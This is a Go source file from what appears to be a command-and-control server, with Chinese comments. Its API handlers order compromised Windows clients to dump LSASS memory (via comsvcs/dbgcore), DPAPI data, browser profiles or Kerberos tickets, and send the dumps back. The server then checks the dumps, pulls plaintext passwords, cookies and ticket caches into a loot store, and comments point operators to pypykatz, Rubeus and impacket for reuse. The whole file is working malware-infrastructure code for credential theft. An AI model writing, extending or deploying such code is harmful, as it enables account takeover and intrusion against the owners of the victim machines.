package api

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/cred"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/metrics"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"encoding/binary"
	"fmt"
	"net/http"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// ===== 凭据获取（阶段三）=====
//
// 链路：operatorOnly 接口 → 建任务(kind=cred) → 登记"等待回传的制品"
//      → 下发 CRED_DUMP → 客户端获取内存转储 → 经**下载通道**回传
//      → 下载完成回调按文件名匹配 → 校验 minidump → 登记制品 + 收敛任务 + 审计。
//
// 刻意不做的事：服务端不解析转储内容（那是 mimikatz/pypykatz 的活），
// 只保证"制品是真的、归属是对的、谁在什么时候取过有记录"。
// 凭据获取是最敏感的运维动作，审计与归属比解析功能重要。

// credArtifactTTL 制品回传等待上限：超时后不再把回传的文件认作该请求的产物
const credArtifactTTL = 30 * time.Minute

// DumpCredential POST /api/cred/dump  {uid, kind, tech}
func DumpCredential(c *gin.Context) {
	var req struct {
		UID  string `json:"uid"`
		Kind string `json:"kind"`
		Tech string `json:"tech"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	req.UID = strings.TrimSpace(req.UID)
	req.Kind = strings.TrimSpace(strings.ToLower(req.Kind))
	req.Tech = strings.TrimSpace(strings.ToLower(req.Tech))
	if req.UID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "缺少 uid"})
		return
	}
	if req.Kind == "" {
		req.Kind = cred.KindLsass
	}
	if !cred.IsKindSupported(req.Kind) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "不支持的凭据类型: " + req.Kind})
		return
	}
	// 技术按类型校验：把 browser 配成 comsvcs 这类组合必须当场拒绝，
	// 而不是下发一个客户端必然报错的任务
	if req.Tech == "" {
		req.Tech = cred.DefaultTech(req.Kind)
	}
	if !cred.IsTechSupportedFor(req.Kind, req.Tech) {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": fmt.Sprintf("类型 %s 不支持的技术: %s（可选: %s）",
				req.Kind, req.Tech, strings.Join(cred.TechsFor(req.Kind), "/")),
		})
		return
	}

	// 协作：会话被其他操作员占用时拒绝（凭据获取是最不该撞车的操作）
	if !checkSessionLock(c, req.UID) {
		return
	}

	client, err := database.GetClientByUid(req.UID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "客户端不存在: " + req.UID})
		return
	}
	// 技术选型都是 Windows 专有路径（comsvcs/dbgcore/DPAPI/浏览器配置目录），非 Windows
	// 会话直接拒绝，不让操作员对着 Linux 会话点下去等一个必然失败的任务
	if !strings.EqualFold(client.Os, "windows") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "凭据获取当前仅支持 Windows 会话（该会话系统: " + client.Os + "）"})
		return
	}

	operator := operatorFromContext(c)
	fileName := cred.NewFileName(req.Kind, client.Computer, time.Now())
	if err := cred.Global.Issue(cred.ArtifactRequest{
		UID: req.UID, Kind: req.Kind, FileName: fileName, Tech: req.Tech, Operator: operator,
		Format: cred.FormatByKind(req.Kind),
	}, credArtifactTTL); err != nil {
		c.JSON(http.StatusConflict, gin.H{"error": "已有相同的获取请求在进行中: " + err.Error()})
		return
	}

	cmdText := fmt.Sprintf("%s %s", req.Kind, req.Tech)
	_, rows := createTaskRows([]string{req.UID}, operator, "cred", cmdText)
	var taskID int64
	if len(rows) > 0 {
		taskID = rows[0].Id
	}

	// 帧格式与服务端/客户端常量一致：cmdBuf = "kind|tech|fileName"
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, command.CRED_DUMP)
	frame := utils.BytesCombine(cmdTypeBytes, []byte(req.Kind+"|"+req.Tech+"|"+fileName))
	if err := sendcommand.SendFileUploadCommandChecked(req.UID, frame); err != nil {
		cred.Global.Cancel(req.UID, fileName)
		finishTask(taskID, taskStatusFailed, "", err.Error())
		auditLogEvent("CRED_ACCESS", "FAILURE",
			fmt.Sprintf("凭据获取下发失败 %s/%s: %v", req.Kind, req.UID, err), nil)
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "下发失败: " + err.Error()})
		return
	}

	auditLogEvent("CRED_ACCESS", "START",
		fmt.Sprintf("%s 对会话 %s 发起 %s 获取（技术: %s，制品: %s）", operator, req.UID, req.Kind, req.Tech, fileName),
		map[string]interface{}{"uid": req.UID, "kind": req.Kind, "tech": req.Tech, "artifact": fileName})
	publishOperatorAction(req.UID, operator, "cred", req.Kind+" "+req.Tech)

	c.JSON(http.StatusOK, gin.H{
		"status":  http.StatusOK,
		"task_id": taskID,
		"data": gin.H{
			"file_name":  fileName,
			"kind":       req.Kind,
			"tech":       req.Tech,
			"format":     cred.FormatByKind(req.Kind),
			"expires_in": int(credArtifactTTL.Seconds()),
		},
	})
}

// ListCredArtifacts GET /api/cred/artifacts?uid=
// 返回"等待回传的请求"与"已登记的制品"两部分：前者让操作员知道还差什么，
// 后者是已落地的成果（制品本体在 Downloads 目录，用文件下载接口取回）。
// 制品以 loot.source 标记来源类型（lsass/dpapi/browser），这里按同一份类型清单过滤 ——
// 过滤条件写死单一类型会让新模块的制品在弹窗里"看不见"。
func ListCredArtifacts(c *gin.Context) {
	uid := strings.TrimSpace(c.Query("uid"))

	pending := cred.Global.Pending(uid)
	artifacts := make([]database.Loot, 0)
	if database.DB() != nil {
		artifacts, _ = database.LootStore_().ListBySources(cred.Kinds, uid, 200)
	}

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": gin.H{
		"pending":   pending,
		"artifacts": artifacts,
	}})
}

// matchCredArtifact 下载完成回调的凭据分支：
// 命中未完成请求时按凭据链路收敛（校验制品 → 登记 → 任务终态 → 审计），
// 返回 true 表示这个文件是凭据请求的产物，调用方不必再按普通下载处理。
func matchCredArtifact(uid, filePath, status string) bool {
	fileName := filepath.Base(filePath)
	req, ok := cred.Global.Match(uid, fileName)
	if !ok {
		return false
	}
	req.Sanitize()

	if status != command.DownloadStatusCompleted {
		finishTask(req.TaskID, taskStatusFailed, "", "制品回传未完成（客户端断开或长时间无数据）")
		auditLogEvent("CRED_ACCESS", "FAILURE",
			fmt.Sprintf("%s 制品回传未完成: %s", req.Kind, fileName),
			map[string]interface{}{"uid": uid, "artifact": fileName})
		return true
	}

	info, err := cred.ValidateArtifact(req.Kind, req.Format, filePath)
	if err != nil {
		// 半截文件/权限不足导致的空制品必须显式失败，不能登记成"制品"
		logx.Warnf("❌ [CRED] 制品校验失败 uid=%s kind=%s file=%s: %v\n", uid, req.Kind, fileName, err)
		finishTask(req.TaskID, taskStatusFailed, "", "制品校验失败: "+err.Error())
		auditLogEvent("CRED_ACCESS", "FAILURE",
			fmt.Sprintf("制品校验失败 %s: %v", fileName, err), map[string]interface{}{"uid": uid})
		return true
	}

	metrics.CredArtifact(req.Kind)

	// 浏览器制品额外做一件事：把明文口令/Cookie 解析出来登记进凭据库。
	// 制品本体照样留档（复核用），但战果要立刻在凭据库里可见。
	credCount, cookieCount, ticketCount := 0, 0, 0
	if req.Kind == cred.KindBrowser {
		art, perr := cred.ParseBrowserArtifact(filePath)
		if perr != nil {
			logx.Warnf("⚠️ [CRED] 浏览器制品解析失败（制品本体仍留档）uid=%s file=%s: %v\n", uid, fileName, perr)
		} else {
			credCount, cookieCount = ingestBrowserArtifact(uid, art)
		}
	}
	// Kerberos 票据：每个 ccache 登记一条 ticket 战果（principal / 到期 / 票据数），
	// 原始文件留在制品里，供操作员导入（kinit -c / Rubeus ptt / impacket）。
	if req.Kind == cred.KindTicket {
		art, perr := cred.ParseTicketArtifact(filePath)
		if perr != nil {
			logx.Warnf("⚠️ [CRED] 票据制品解析失败（制品本体仍留档）uid=%s file=%s: %v\n", uid, fileName, perr)
		} else {
			ticketCount = ingestTicketArtifact(uid, art)
		}
	}

	finishTask(req.TaskID, taskStatusCompleted, fmt.Sprintf("制品已回传: %s（%s）", filePath, info.Describe()), "")
	auditDescription := fmt.Sprintf("%s 制品已回传: %s（%s）", req.Kind, fileName, info.Describe())
	if credCount > 0 || cookieCount > 0 || ticketCount > 0 {
		auditDescription += fmt.Sprintf("；已入库 %d 条口令、%d 条 Cookie、%d 个票据缓存",
			credCount, cookieCount, ticketCount)
	}
	auditLogEvent("CRED_ACCESS", "SUCCESS", auditDescription,
		map[string]interface{}{
			"uid": uid, "artifact": fileName, "size": info.Size, "kind": req.Kind,
			"credentials": credCount, "cookies": cookieCount, "ticket_caches": ticketCount,
		})

	note := ""
	source := req.Kind
	switch req.Kind {
	case cred.KindBrowser:
		note = browserArtifactNote(info)
	case cred.KindDPAPI:
		note = dpapiArtifactNote(info)
	case cred.KindTicket:
		note = ticketArtifactNote(info)
	default:
		note = fmt.Sprintf("%s 内存转储，%s；本地解析: pypykatz lsa minidump <文件>",
			strings.ToUpper(req.Kind), info.Describe())
	}
	AddLootIfNotEmpty(uid, "dump", "", "", "", filePath, note, source)
	command.PublishEvent(command.EventLootNew, uid, map[string]interface{}{
		"type": "dump", "source": source, "file": fileName, "operator": req.Operator,
		"credentials": credCount, "cookies": cookieCount, "ticket_caches": ticketCount,
	})
	return true
}
